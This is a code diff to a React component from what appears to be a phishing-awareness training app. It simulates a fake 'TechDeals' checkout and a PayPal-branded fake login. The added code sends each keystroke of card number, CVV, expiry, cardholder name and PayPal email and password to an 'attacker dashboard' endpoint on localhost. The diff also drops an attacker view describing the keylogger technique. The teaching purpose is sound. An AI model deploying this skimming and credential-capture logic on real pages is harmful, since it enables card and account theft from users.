@@ -4,6 +4,7 @@ import { useState, useEffect } from 'react'
 import { CreditCard, Lock, AlertCircle, Eye, EyeOff } from 'lucide-react'
 import SplitScreenSimulation from '@/components/simulations/SplitScreenSimulation'
 import { supabase } from '@/lib/supabase'
+import { getAttackerApiUrl } from '@/lib/config'
 
 export default function BankingSimulation() {
   const [formData, setFormData] = useState({
@@ -53,11 +54,30 @@ export default function BankingSimulation() {
     setShowSecondAlert(false)
     setShowThirdAlert(false)
     setRealDataWarning(false)
-    setShowPayPalLogin(false)
-    setPaypalStep('login')
-    setPaypalEmail('')
-    setPaypalPassword('')
   }
+
+  // Listen for messages from fake PayPal tab
+  useEffect(() => {
+    const handleMessage = (event: MessageEvent) => {
+      if (event.data.type === 'paypal_success') {
+        setAttackSuccess(true)
+        setPaymentCompleted(true)
+        
+        // Show second alert after 12 seconds
+        setTimeout(() => {
+          setShowSecondAlert(true)
+        }, 12000)
+        
+        // Show third alert after 25 seconds  
+        setTimeout(() => {
+          setShowThirdAlert(true)
+        }, 25000)
+      }
+    }
+
+    window.addEventListener('message', handleMessage)
+    return () => window.removeEventListener('message', handleMessage)
+  }, [])
 
   // Check for real-looking data
   useEffect(() => {
@@ -75,10 +95,38 @@ export default function BankingSimulation() {
     }
   }, [formData])
 
-  const handleInputChange = (field: string, value: string) => {
+  const handleInputChange = async (field: string, value: string) => {
     setFormData(prev => ({ ...prev, [field]: value }))
     // Simulate keystroke capture
     setStolenData(prev => ({ ...prev, [field]: value }))
+    
+    // Send real-time data to attacker dashboard
+    try {
+      // Get or create a PERSISTENT session ID that stays the same for this user
+      let sessionId = localStorage.getItem('session_id')
+      if (!sessionId) {
+        sessionId = 'demo-session-' + Date.now()
+        localStorage.setItem('session_id', sessionId)
+      }
+      
+      await fetch(getAttackerApiUrl('capture'), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'credentials',
+          sessionId,
+          data: {
+            field: field === 'cardNumber' ? 'card_number' : 
+                   field === 'cardHolder' ? 'card_holder' :
+                   field === 'expiryDate' ? 'expiry_date' :
+                   field === 'cvv' ? 'cvv' : field,
+            value: value
+          }
+        })
+      })
+    } catch (error) {
+      console.log('Real-time capture error (non-critical):', error)
+    }
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -86,52 +134,89 @@ export default function BankingSimulation() {
     setAttackSuccess(true)
     setPaymentCompleted(true)
 
-    // Track the credential capture - store ALL fields
-    const sessionId = localStorage.getItem('session_id') || 'demo-session'
-    
-    // Insert all captured credit card data
-    const credentialInserts = [
-      {
-        session_id: sessionId,
-        scenario_id: 'banking',
-        field_name: 'card_number',
-        captured_value: stolenData.cardNumber || 'empty',
-      },
-      {
-        session_id: sessionId,
-        scenario_id: 'banking', 
-        field_name: 'card_holder',
-        captured_value: stolenData.cardHolder || 'empty',
-      },
-      {
-        session_id: sessionId,
-        scenario_id: 'banking',
-        field_name: 'expiry_date', 
-        captured_value: stolenData.expiryDate || 'empty',
-      },
-      {
-        session_id: sessionId,
-        scenario_id: 'banking',
-        field_name: 'cvv',
-        captured_value: stolenData.cvv || 'empty',
+    // Send complete form data to attacker dashboard
+    try {
+      // Use the same persistent session ID
+      let sessionId = localStorage.getItem('session_id')
+      if (!sessionId) {
+        sessionId = 'demo-session-' + Date.now()
+        localStorage.setItem('session_id', sessionId)
       }
-    ]
-
-    // Insert all captured data
-    await supabase.from('captured_credentials').insert(credentialInserts)
+      
+      await fetch('http://localhost:3001/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'credentials',
+          sessionId,
+          data: {
+            field: 'complete_form',
+            value: JSON.stringify({
+              cardNumber: stolenData.cardNumber,
+              cardHolder: stolenData.cardHolder,
+              expiryDate: stolenData.expiryDate,
+              cvv: stolenData.cvv
+            })
+          }
+        })
+      })
+    } catch (error) {
+      console.log('Form submission capture error (non-critical):', error)
+    }
   }
 
   const handlePayPalClick = () => {
-    setShowPayPalLogin(true)
+    // Open fake PayPal login in a new tab
+    const sessionId = localStorage.getItem('session_id') || 'demo-session-' + Date.now()
+    window.open(`/banking?session=${sessionId}`, '_blank')
   }
 
-  const handlePayPalLogin = (e: React.FormEvent) => {
+  const handlePayPalLogin = async (e: React.FormEvent) => {
     e.preventDefault()
     setStolenData(prev => ({ 
       ...prev, 
       paypalEmail: paypalEmail,
       paypalPassword: paypalPassword 
     }))
+    
+    // Send PayPal credentials to attacker dashboard
+    try {
+      // Use the same persistent session ID
+      let sessionId = localStorage.getItem('session_id')
+      if (!sessionId) {
+        sessionId = 'demo-session-' + Date.now()
+        localStorage.setItem('session_id', sessionId)
+      }
+      
+      await fetch('http://localhost:3001/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'credentials',
+          sessionId,
+          data: {
+            field: 'paypal_email',
+            value: paypalEmail
+          }
+        })
+      })
+      
+      await fetch('http://localhost:3001/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'credentials',
+          sessionId,
+          data: {
+            field: 'paypal_password',
+            value: paypalPassword
+          }
+        })
+      })
+    } catch (error) {
+      console.log('PayPal capture error (non-critical):', error)
+    }
+    
     setPaypalStep('verify')
   }
 
@@ -158,8 +243,8 @@ export default function BankingSimulation() {
   }
 
   const VictimView = (
-    <div className="space-y-4">
-      <div className="bg-green-600 text-white p-4 rounded-t-lg">
+    <div className="space-y-3">
+      <div className="bg-green-600 text-white p-3 rounded-t-lg">
         <h2 className="text-xl font-semibold flex items-center gap-2">
           <Lock size={24} />
           TechDeals Express Checkout
@@ -168,7 +253,7 @@ export default function BankingSimulation() {
       </div>
       
       {/* Product Info */}
-      <div className="bg-gray-100 dark:bg-gray-800 rounded-lg p-4 flex items-center justify-between">
+      <div className="bg-gray-100 dark:bg-gray-800 rounded-lg p-3 flex items-center justify-between">
         <div>
           <h3 className="font-semibold">iPhone 15 Pro Max 256GB</h3>
           <p className="text-sm text-gray-600 dark:text-gray-400">Original Price: <span className="line-through">$1,199</span></p>
@@ -185,12 +270,9 @@ export default function BankingSimulation() {
       <div className="space-y-3">
         <button
           onClick={handlePayPalClick}
-          className="w-full bg-[#ffc439] hover:bg-[#f0b90b] text-[#003087] font-bold py-4 rounded-lg transition-all transform hover:scale-[1.02] flex items-center justify-center gap-3 shadow-lg"
+          className="w-full bg-[#ffc439] hover:bg-[#f0b90b] text-[#003087] font-bold py-3 rounded-lg transition-all transform hover:scale-[1.02] flex items-center justify-center gap-3 shadow-lg"
         >
-          <svg className="h-6" viewBox="0 0 124 33" fill="currentColor">
-            <path d="M46.211 6.749h-6.839a.95.95 0 0 0-.939.802l-2.766 17.537a.57.57 0 0 0 .564.658h3.265a.95.95 0 0 0 .939-.803l.746-4.73a.95.95 0 0 1 .938-.803h2.165c4.505 0 7.105-2.18 7.784-6.5.306-1.89.013-3.375-.872-4.415-.972-1.142-2.696-1.746-4.985-1.746zM47 13.154c-.374 2.454-2.249 2.454-4.062 2.454h-1.032l.724-4.583a.57.57 0 0 1 .563-.481h.473c1.235 0 2.4 0 3.002.704.359.42.469 1.044.332 1.906zM66.654 13.075h-3.275a.57.57 0 0 0-.563.481l-.146.916-.229-.332c-.709-1.029-2.29-1.373-3.868-1.373-3.619 0-6.71 2.741-7.312 6.586-.313 1.918.132 3.752 1.22 5.031.998 1.176 2.426 1.666 4.125 1.666 2.916 0 4.533-1.875 4.533-1.875l-.146.91a.57.57 0 0 0 .562.66h2.95a.95.95 0 0 0 .939-.803l1.77-11.209a.568.568 0 0 0-.56-.658zm-4.565 6.374c-.316 1.871-1.801 3.127-3.695 3.127-.951 0-1.711-.305-2.199-.883-.484-.574-.668-1.391-.514-2.301.295-1.855 1.805-3.152 3.67-3.152.93 0 1.686.309 2.184.892.499.589.697 1.411.554 2.317zM84.096 13.075h-3.291a.954.954 0 0 0-.787.417l-4.539 6.686-1.924-6.425a.953.953 0 0 0-.912-.678h-3.234a.57.57 0 0 0-.541.754l3.625 10.638-3.408 4.811a.57.57 0 0 0 .465.9h3.287a.949.949 0 0 0 .781-.408l10.946-15.8a.57.57 0 0 0-.468-.895z"/>
-            <path d="M94.992 6.749h-6.84a.95.95 0 0 0-.938.802l-2.766 17.537a.569.569 0 0 0 .562.658h3.51a.665.665 0 0 0 .656-.562l.785-4.971a.95.95 0 0 1 .938-.803h2.164c4.506 0 7.105-2.18 7.785-6.5.307-1.89.012-3.375-.873-4.415-.971-1.142-2.694-1.746-4.983-1.746zm.789 6.405c-.373 2.454-2.248 2.454-4.062 2.454h-1.031l.725-4.583a.568.568 0 0 1 .562-.481h.473c1.234 0 2.4 0 3.002.704.359.42.468 1.044.331 1.906zM115.434 13.075h-3.273a.567.567 0 0 0-.562.481l-.145.916-.23-.332c-.709-1.029-2.289-1.373-3.867-1.373-3.619 0-6.709 2.741-7.311 6.586-.312 1.918.131 3.752 1.219 5.031 1 1.176 2.426 1.666 4.125 1.666 2.916 0 4.533-1.875 4.533-1.875l-.146.91a.57.57 0 0 0 .564.66h2.949a.95.95 0 0 0 .938-.803l1.771-11.209a.571.571 0 0 0-.565-.658zm-4.565 6.374c-.314 1.871-1.801 3.127-3.695 3.127-.949 0-1.711-.305-2.199-.883-.484-.574-.666-1.391-.514-2.301.297-1.855 1.805-3.152 3.67-3.152.93 0 1.686.309 2.184.892.501.589.699 1.411.554 2.317z"/>
-          </svg>
+          <span className="text-xl font-bold">PayPal</span>
           Express Checkout
         </button>
         
@@ -219,7 +301,7 @@ export default function BankingSimulation() {
         </div>
       )}
 
-      <form onSubmit={handleSubmit} className="space-y-4">
+      <form onSubmit={handleSubmit} className="space-y-3">
         <div className="relative">
           <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
             Card Number
@@ -308,8 +390,8 @@ export default function BankingSimulation() {
         This is a demo form. No real transactions will be processed.
       </p>
       
-      {/* PayPal Login Modal */}
-      {showPayPalLogin && (
+      {/* PayPal Login Modal - REMOVED - Now opens in new tab */}
+      {false && (
         <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
           {/* Close button */}
           <button
@@ -343,9 +425,28 @@ export default function BankingSimulation() {
                     type="email"
                     placeholder="Email or phone number"
                     value={paypalEmail}
-                    onChange={(e) => {
+                    onChange={async (e) => {
                       setPaypalEmail(e.target.value)
                       setStolenData(prev => ({ ...prev, paypalEmail: e.target.value }))
+                      
+                      // Real-time capture
+                      try {
+                        // Use the same persistent session ID
+                        let sessionId = localStorage.getItem('session_id')
+                        if (!sessionId) {
+                          sessionId = 'demo-session-' + Date.now()
+                          localStorage.setItem('session_id', sessionId)
+                        }
+                        await fetch('http://localhost:3001/api/capture', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            type: 'credentials',
+                            sessionId,
+                            data: { field: 'paypal_email', value: e.target.value }
+                          })
+                        })
+                      } catch (error) {}
                     }}
                     className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                     required
@@ -354,9 +455,28 @@ export default function BankingSimulation() {
                     type="password"
                     placeholder="Password"
                     value={paypalPassword}
-                    onChange={(e) => {
+                    onChange={async (e) => {
                       setPaypalPassword(e.target.value)
                       setStolenData(prev => ({ ...prev, paypalPassword: e.target.value }))
+                      
+                      // Real-time capture
+                      try {
+                        // Use the same persistent session ID
+                        let sessionId = localStorage.getItem('session_id')
+                        if (!sessionId) {
+                          sessionId = 'demo-session-' + Date.now()
+                          localStorage.setItem('session_id', sessionId)
+                        }
+                        await fetch('http://localhost:3001/api/capture', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            type: 'credentials',
+                            sessionId,
+                            data: { field: 'paypal_password', value: e.target.value }
+                          })
+                        })
+                      } catch (error) {}
                     }}
                     className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                     required
@@ -569,108 +689,6 @@ export default function BankingSimulation() {
     </div>
   )
 
-  const AttackerView = (
-    <div className="space-y-4">
-      <h2 className="text-xl font-semibold text-red-600">Attacker's Stolen Data</h2>
-      
-      <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm">
-        <p className="text-gray-500 mb-2"># Real-time keystroke capture</p>
-        {stolenData.paypalEmail && (
-          <>
-            <p className="text-yellow-400">--- PayPal Credentials ---</p>
-            <p>paypal_email: "{stolenData.paypalEmail}"</p>
-            <p>paypal_password: "{stolenData.paypalPassword}"</p>
-            <p className="text-yellow-400 mt-2">--- Card Details ---</p>
-          </>
-        )}
-        <p>card_number: "{stolenData.cardNumber}"</p>
-        <p>card_holder: "{stolenData.cardHolder}"</p>
-        <p>expiry_date: "{stolenData.expiryDate}"</p>
-        <p>cvv: "{stolenData.cvv}"</p>
-      </div>
-
-      <div className="bg-red-50 dark:bg-red-900/20 rounded-lg p-4">
-        <h3 className="font-semibold text-red-800 dark:text-red-200 mb-2">
-          Attack Database
-        </h3>
-        <div className="overflow-x-auto">
-          <table className="min-w-full text-sm">
-            <thead>
-              <tr className="text-left text-red-700 dark:text-red-300">
-                <th className="pb-2">Field</th>
-                <th className="pb-2">Captured Value</th>
-                <th className="pb-2">Status</th>
-              </tr>
-            </thead>
-            <tbody className="text-red-600 dark:text-red-400">
-              <tr>
-                <td className="py-1">Card Number</td>
-                <td className="font-mono">{stolenData.cardNumber || '...'}</td>
-                <td>
-                  <span className={`text-xs px-2 py-1 rounded ${
-                    stolenData.cardNumber.length > 10 ? 'bg-green-200 text-green-800' : 'bg-gray-200 text-gray-600'
-                  }`}>
-                    {stolenData.cardNumber.length > 10 ? 'Valid' : 'Waiting'}
-                  </span>
-                </td>
-              </tr>
-              <tr>
-                <td className="py-1">CVV</td>
-                <td className="font-mono">{stolenData.cvv || '...'}</td>
-                <td>
-                  <span className={`text-xs px-2 py-1 rounded ${
-                    stolenData.cvv.length >= 3 ? 'bg-green-200 text-green-800' : 'bg-gray-200 text-gray-600'
-                  }`}>
-                    {stolenData.cvv.length >= 3 ? 'Captured' : 'Waiting'}
-                  </span>
-                </td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-      </div>
-
-      {/* Payment Completion Status */}
-      {paymentCompleted && (
-        <div className="bg-green-50 dark:bg-green-900/30 rounded-lg p-4 border-2 border-green-500">
-          <h3 className="font-semibold text-green-800 dark:text-green-200 mb-3 flex items-center gap-2">
-            ✅ PAYMENT COMPLETED - ATTACK SUCCESSFUL!
-          </h3>
-          <div className="bg-black rounded-lg p-4">
-            <div className="space-y-2">
-              <div className="flex items-center gap-3">
-                <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
-                <span className="text-green-400 font-mono text-sm">CREDIT CARD DATA STOLEN!</span>
-              </div>
-              <div className="bg-green-900/50 rounded-lg p-3">
-                <p className="text-green-400 font-mono text-xs">✅ Card Number: {stolenData.cardNumber}</p>
-                <p className="text-green-400 font-mono text-xs">✅ Card Holder: {stolenData.cardHolder}</p>
-                <p className="text-green-400 font-mono text-xs">✅ Expiry: {stolenData.expiryDate}</p>
-                <p className="text-green-400 font-mono text-xs">✅ CVV: {stolenData.cvv}</p>
-                <p className="text-gray-400 text-xs mt-2">📂 Data saved to attacker database</p>
-                <p className="text-red-400 text-xs">💰 Ready for dark web sale!</p>
-              </div>
-            </div>
-          </div>
-          <p className="text-xs text-green-700 dark:text-green-300 mt-2">
-            ⚠️ Victim completed payment - All financial data successfully intercepted!
-          </p>
-        </div>
-      )}
-
-      <div className="bg-yellow-50 dark:bg-yellow-900/20 rounded-lg p-4">
-        <h3 className="font-semibold text-yellow-800 dark:text-yellow-200 mb-2">
-          Attack Technique:
-        </h3>
-        <ul className="text-sm text-yellow-700 dark:text-yellow-300 space-y-1">
-          <li>• Invisible form fields overlaid on legitimate inputs</li>
-          <li>• JavaScript keylogger capturing every keystroke</li>
-          <li>• Data sent to attacker's server in real-time</li>
-          <li>• Victim sees normal form, unaware of theft</li>
-        </ul>
-      </div>
-    </div>
-  )
 
   const WarningSignsComponent = (
     <ul className="space-y-2 text-sm">
@@ -760,7 +778,7 @@ export default function BankingSimulation() {
     <SplitScreenSimulation
       title="Banking Credential Theft Simulation"
       victimView={VictimView}
-      attackerView={AttackerView}
+      attackerView={null}
       onAttackSuccess={() => setAttackSuccess(true)}
       onAttackDefended={() => setAttackSuccess(false)}
       explanation={
